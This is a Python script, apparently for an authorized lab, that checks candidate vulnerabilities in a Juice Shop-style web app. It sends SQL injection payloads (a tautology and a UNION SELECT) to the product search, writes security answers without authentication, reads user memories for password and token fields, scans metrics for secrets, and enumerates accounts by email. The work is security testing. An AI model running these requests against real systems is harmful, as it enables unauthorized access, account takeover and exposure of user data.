#!/usr/bin/env python3
"""Fresh live verification of candidate mechanisms on the current boot.
Records exact reproducible requests with current timestamps."""
import json, urllib.parse, urllib.request, time, re

BASE = "http://lab-mutator:3000"
T0 = time.time()
OUT = {}

def req(method, url, body=None, headers=None):
    h = {"User-Agent": "Kilo/1.0 (authorized-security-lab)"}
    if headers: h.update(headers)
    data = body.encode() if isinstance(body, str) else json.dumps(body).encode() if body else None
    u = BASE + url
    r = urllib.request.Request(u, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            b = resp.read().decode("utf-8", "replace")
            return resp.status, dict(resp.headers), len(b), b
    except urllib.error.HTTPError as e:
        b = e.read().decode("utf-8", "replace")
        return e.code, dict(e.headers), len(b), b
    except Exception as e:
        return None, {"error": str(e)}, 0, ""

def scan_json(path, key, obj, keys):
    for k in keys:
        if k in str(obj):
            obj[key] = True
            return

def tryjson(s):
    try: return json.loads(s)
    except: return None

# --- Pass 0: baseline
OUT["baseline_root"] = {"status": req("GET", "/")[0], "len": req("GET", "/")[2]}
OUT["baseline_metrics"] = {"status": req("GET", "/metrics")[0], "len": req("GET", "/metrics")[2]}
OUT["baseline_robots"] = {"status": req("GET", "/robots.txt")[0], "body": req("GET", "/robots.txt")[3].strip()}

# --- F1: /rest/memories
r = req("GET", "/rest/memories")
mem = tryjson(r[3])
OUT["F1_memories"] = {"status": r[0], "ct": r[1].get("content-type"), "len": r[2], "count": len(mem) if isinstance(mem, list) else None}
if isinstance(mem, list) and mem:
    scan_json("F1_memories", "has_password", mem[0], ["password", "deluxeToken", "totpSecret", "email"])
    OUT["F1_sample_user_fields"] = list(mem[0].keys())
r_b = req("GET", "/rest/memories", headers={"Authorization": "Bearer x"})
OUT["F1_bogus_bearer"] = {"status": r_b[0], "identical": r_b[0]==r[0]}
for p in ["/rest/wallet/balance", "/rest/basket", "/rest/user/authentication-details", "/api/SecurityAnswers/", "/rest/order-history"]:
    OUT["F1_control_"+p.split("/")[-1]] = {"status": req("GET", p)[0]}

# --- F2: /api/SecurityAnswers/ unauth write
sec_base = {"questionId": 7, "answer": "verify-new", "email": "verify@repro.test"}
r1 = req("POST", "/api/SecurityAnswers/", body=sec_base)
j1 = tryjson(r1[3]) or {}
sec_base2 = {"questionId": 8, "answer": "x", "email": "verify2@repro.test"}
r2 = req("POST", "/api/SecurityAnswers/", body=sec_base2)
j2 = tryjson(r2[3]) or {}
sec_empty = req("POST", "/api/SecurityAnswers/", body={})
sec_get = req("GET", "/api/SecurityAnswers/")
OUT["F2"] = {"get_status": sec_get[0], "post1_status": r1[0], "post1_id": j1.get("id"),
             "post1_createdAt": j1.get("createdAt"), "post2_status": r2[0], "post2_id": j2.get("id"),
             "post2_createdAt": j2.get("createdAt"), "post_empty_status": sec_empty[0],
             "ids_increased": bool(j1.get("id")) and bool(j2.get("id")) and j1.get("id") < j2.get("id")}

# --- F3: search filter bypass
r_apple = req("GET", "/rest/products/search?q=Apple")
r_taut = req("GET", "/rest/products/search?q=' OR '1'='1")
r_malf = req("GET", "/rest/products/search?q=a UNION SELECT 1,2,3,4,5,6,7--")
j_apple = tryjson(r_apple[3]) or []
j_taut = tryjson(r_taut[3]) or []
if not isinstance(j_apple, list): j_apple = []
if not isinstance(j_taut, list): j_taut = []
OUT["F3"] = {"q_Apple_status": r_apple[0], "q_Apple_length": r_apple[2],
             "q_Apple_ids": [p.get("id") for p in j_apple if isinstance(p, dict)],
             "tautology_status": r_taut[0], "tautology_length": r_taut[2],
             "tautology_ids": [p.get("id") for p in j_taut if isinstance(p, dict)],
             "malformed_status": r_malf[0], "malformed_preview": r_malf[3][:150]}
r_prods = req("GET", "/rest/products/search")
jp = tryjson(r_prods[3]) or []
names = set()
for p in (jp if isinstance(jp, list) else []):
    if isinstance(p, dict):
        for k in ["productName", "name", "title"]:
            if k in p and isinstance(p[k], str): names.add(p[k])
OUT["F3_catalog_names_count"] = len(names)
ids_taut = set(p.get("id") for p in j_taut if isinstance(p, dict))
ids_all = set(p.get("id") for p in jp if isinstance(p, dict))
OUT["F3_taut_equals_all_records"] = bool(ids_all) and ids_taut == ids_all
OUT["F3_taut_contains_no_catalog_name"] = not (set(names) & ids_taut)

# --- F4: /metrics observability + secrets scan
m = req("GET", "/metrics")[3]
sec = [ln for ln in m.splitlines() if re.search(r"\b(password|secret|token|api_key|credential|private_key|bearer|access_token)\b", ln, re.I)]
OUT["F4"] = {"status": 200, "len": len(m), "ct": req("GET", "/metrics")[1].get("content-type"), "secrets_found": len(sec)}

# --- F5: security-question enumeration
def secq(email):
    return req("GET", "/rest/user/security-question?email="+urllib.parse.quote(email))
r_exist1 = secq("bjoern@owasp.org"); r_exist2 = secq("emma@juice-sh.op"); r_exist3 = secq("john@juice-sh.op"); r_nonexist = secq("no.such.user@juice-sh.op")
def qres(r):
    j = tryjson(r[3])
    return {"status": r[0], "has_question": bool(j and isinstance(j.get("question"), dict)), "question": str(j) if j else r[3]}
OUT["F5"] = {"exist_bjoern": qres(r_exist1), "exist_emma": qres(r_exist2), "exist_john": qres(r_exist3),
             "nonexist": {"status": r_nonexist[0], "body": r_nonexist[3]}}

# --- auth surface status
r_login = req("POST", "/rest/user/login", body={"email":"a@b.com","password":"c"})
r_reg = req("POST", "/rest/user/register", body={})
r_order = req("GET", "/rest/order-history")
OUT["auth"] = {"login_POST_status": r_login[0], "login_body": r_login[3][:80],
               "register_POST_status": r_reg[0], "register_body": r_reg[3][:80],
               "order_history_GET_status": r_order[0]}

print(json.dumps(OUT, indent=1, default=str))
